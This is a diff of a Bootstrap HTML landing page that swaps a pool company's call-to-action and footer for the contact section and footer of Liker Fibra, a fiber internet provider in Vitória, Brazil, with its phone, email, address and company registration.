+                <i class="bi bi-pin-map-fill fs-1 text-liker-orange"></i>
+                <div>
+                  <strong>Sede</strong>
+                  <p class="mb-0">Vitória/ES · Centro</p>
+                </div>
+              </div>
+            </div>
+          </div>
+          <hr class="my-4">
+          <p class="text-secondary"><i class="bi bi-bank2 me-2"></i> Atividade principal: <strong>61.10-8-03 - Serviços de comunicação multimídia (SCM)</strong> · situação cadastral: <span class="badge bg-success">Ativa</span></p>
+        </div>
+      </div>
     </div>
-</section>
+  </section>
 
-<!-- ===== CTA FINAL ===== -->
-<section class="bg-wave py-5">
-    <div class="container text-center text-white py-3">
-        <h2 class="display-6 fw-bold mb-3">Venha fazer um orçamento sem compromisso</h2>
-        <p class="lead mb-4">Atendimento personalizado e produtos de qualidade premium.</p>
-        <a href="#contato" class="btn btn-coral btn-lg px-5 py-3 rounded-pill"><i class="bi bi-calendar-check me-2"></i>Agende uma visita</a>
-    </div>
-</section>
-
-<!-- ===== FOOTER com dados de registro ===== -->
-<footer class="bg-wave text-white-50 pt-5 pb-3" style="border-top: 2px solid #7ed4e6;">
+  <!-- LOCALIZAÇÃO + DADOS DE CONTATO (ícones) -->
+  <section id="contato" class="py-5 bg-liker-soft">
     <div class="container">
-        <div class="row">
-            <div class="col-md-4 mb-4">
-                <h5 class="text-white fw-bold"><i class="bi bi-droplet-half text-pool"></i> Bragança Piscinas</h5>
-                <p class="small">CNPJ 03.430.365/0001-44 · IE 225.196.461.114<br>
-                Razão Social: Braganca Piscinas e Acessorios LTDA<br>
-                Fundação: 29/09/1999 (26 anos, 4 meses e 24 dias) · Ativa</p>
-            </div>
-            <div class="col-md-4 mb-4">
-                <h5 class="text-white fw-bold">Navegação</h5>
-                <ul class="list-unstyled">
-                    <li><a href="#home" class="footer-link"><i class="bi bi-chevron-right text-pool small me-1"></i>Início</a></li>
-                    <li><a href="#sobre" class="footer-link"><i class="bi bi-chevron-right text-pool small me-1"></i>Sobre</a></li>
-                    <li><a href="#servicos" class="footer-link"><i class="bi bi-chevron-right text-pool small me-1"></i>Serviços</a></li>
-                    <li><a href="#contato" class="footer-link"><i class="bi bi-chevron-right text-pool small me-1"></i>Contato</a></li>
-                </ul>
-            </div>
-            <div class="col-md-4 mb-4">
-                <h5 class="text-white fw-bold">Horário</h5>
-                <p class="small mb-1">Segunda a sexta: 8h às 18h<br>Sábado: 8h às 12h</p>
-                <div class="d-flex gap-3 mt-3">
-                    <a href="#" class="text-white fs-5"><i class="bi bi-facebook"></i></a>
-                    <a href="#" class="text-white fs-5"><i class="bi bi-instagram"></i></a>
-                    <a href="#" class="text-white fs-5"><i class="bi bi-whatsapp"></i></a>
-                </div>
-            </div>
+      <div class="row mb-5">
+        <div class="col text-center">
+          <h2 class="display-6 fw-bold">Fale com a Liker Fibra</h2>
+          <div class="border-liker-bottom mx-auto"></div>
+          <p class="text-secondary">Canais de atendimento e endereço completo</p>
         </div>
-        <hr class="border-secondary">
-        <div class="text-center small">
-            <span>© 2025 Bragança Piscinas e Acessórios LTDA · Todos os direitos reservados. Endereço para correspondência: Avenida Dos Imigrantes 1728 A, Jd. América, Bragança Paulista/SP, CEP 12902-000</span>
+      </div>
+      <div class="row g-4">
+        <div class="col-lg-4 col-md-6">
+          <div class="d-flex gap-3 p-3 bg-white rounded-4 shadow-sm h-100 hover-scale">
+            <div class="contact-icon"><i class="bi bi-whatsapp"></i></div>
+            <div>
+              <h5 class="fw-bold">WhatsApp / Ligação</h5>
+              <p class="mb-1"><a href="https://wa.me/5527999749588" target="_blank" class="text-decoration-none text-dark">(27) 99974-9588</a></p>
+              <small class="text-secondary">Clique para conversar</small>
+            </div>
+          </div>
         </div>
-    </div>
-</footer>
+        <div class="col-lg-4 col-md-6">
+          <div class="d-flex gap-3 p-3 bg-white rounded-4 shadow-sm h-100 hover-scale">
+            <div class="contact-icon"><i class="bi bi-envelope-paper"></i></div>
+            <div>
+              <h5 class="fw-bold">E-mail</h5>
+              <p class="mb-1"><a href="mailto:contato@likertecom.com.br" class="text-decoration-none text-dark">contato@likertecom.com.br</a></p>
+              <small class="text-secondary">Envie sua mensagem</small>
+            </div>
+          </div>
+        </div>
+        <div class="col-lg-4 col-md-12">
+          <div class="d-flex gap-3 p-3 bg-white rounded-4 shadow-sm h-100 hover-scale">
+            <div class="contact-icon"><i class="bi bi-geo-alt"></i></div>
+            <div>
+              <h5 class="fw-bold">Endereço completo</h5>
+              <p class="mb-0">Avenida Princesa Isabel, 574 - Edif Palas Center Sala 1504 Bloco A<br> Centro, Vitória - ES, 29010-930</p>
+              <small class="text-secondary">Para correspondência: Liker Fibra · Avenida Princesa Isabel 574, Sala 1504, Centro · Vitória/ES · CEP 29010-930</small>
+            </div>
+          </div>
+        </div>
+      </div>
 
-<!-- Bootstrap JS -->
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+      <!-- mini mapa / complemento -->
+      <div class="row mt-5">
+        <div class="col-12">
+          <div class="bg-white p-4 rounded-4 shadow-sm">
+            <div class="row align-items-center">
+              <div class="col-md-8">
+                <i class="bi bi-building fs-1 text-liker-orange float-md-start me-3"></i>
+                <p class="mb-1"><strong>Expediente administrativo:</strong> Liker Telecomunicacoes LTDA - CNPJ 29.832.883/0001-88</p>
+                <p class="mb-0 text-secondary">Abertura 02/03/2018 · 8 anos e 7 dias · Situação Ativa na RFB</p>
+              </div>
+              <div class="col-md-4 text-md-end mt-3 mt-md-0">
+                <a href="https://www.google.com/maps/search/?api=1&query=Avenida+Princesa+Isabel+574+Centro+Vitória+ES" target="_blank" class="btn btn-outline-liker rounded-pill"><i class="bi bi-box-arrow-up-right me-2"></i>Ver no mapa</a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- RODAPÉ com selos e ano -->
+  <footer class="footer py-5">
+    <div class="container">
+      <div class="row gy-4">
+        <div class="col-lg-4">
+          <div class="d-flex align-items-center mb-3">
+            <i class="bi bi-lightning-charge-fill text-liker-orange fs-1 me-2"></i>
+            <span class="fw-bold fs-3 text-white">Liker<span class="text-liker-orange">Fibra</span></span>
+          </div>
+          <p class="text-white-50 small">Internet fibra óptica com velocidade real e suporte humano. Registro Anatel SCM. Vitória/ES.</p>
+          <div class="d-flex gap-2">
+            <span class="badge bg-secondary bg-opacity-25 p-2"><i class="bi bi-facebook"></i></span>
+            <span class="badge bg-secondary bg-opacity-25 p-2"><i class="bi bi-instagram"></i></span>
+            <span class="badge bg-secondary bg-opacity-25 p-2"><i class="bi bi-linkedin"></i></span>
+          </div>
+        </div>
+        <div class="col-lg-3 offset-lg-1">
+          <h5 class="text-white">Institucional</h5>
+          <ul class="list-unstyled">
+            <li class="mb-2"><a href="#sobre">Sobre Liker</a></li>
+            <li class="mb-2"><a href="#planos">Planos</a></li>
+            <li class="mb-2"><a href="#">Política de privacidade</a></li>
+            <li class="mb-2"><a href="#">Trabalhe conosco</a></li>
+          </ul>
+        </div>
+        <div class="col-lg-4">
+          <h5 class="text-white">Contato direto</h5>
+          <ul class="list-unstyled">
+            <li class="mb-2"><i class="bi bi-whatsapp me-2 text-liker-orange"></i> (27) 99974-9588</li>
+            <li class="mb-2"><i class="bi bi-envelope me-2 text-liker-orange"></i> contato@likertecom.com.br</li>
+            <li class="mb-2"><i class="bi bi-pin me-2 text-liker-orange"></i> Avenida Princesa Isabel, 574 - Sala 1504</li>
+            <li class="mb-2"><i class="bi bi-qr-code me-2 text-liker-orange"></i> CNPJ 29.832.883/0001-88</li>
+          </ul>
+        </div>
+      </div>
+      <hr class="border-secondary opacity-25">
+      <div class="d-flex flex-wrap justify-content-between align-items-center">
+        <span class="small">© 2026 Liker Telecomunicacoes LTDA. 8+ anos de fibra em Vitória.</span>
+        <span class="small"><i class="bi bi-shield-check text-liker-orange me-1"></i> Situação cadastral ativa</span>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Bootstrap JS (para navbar toggle) -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
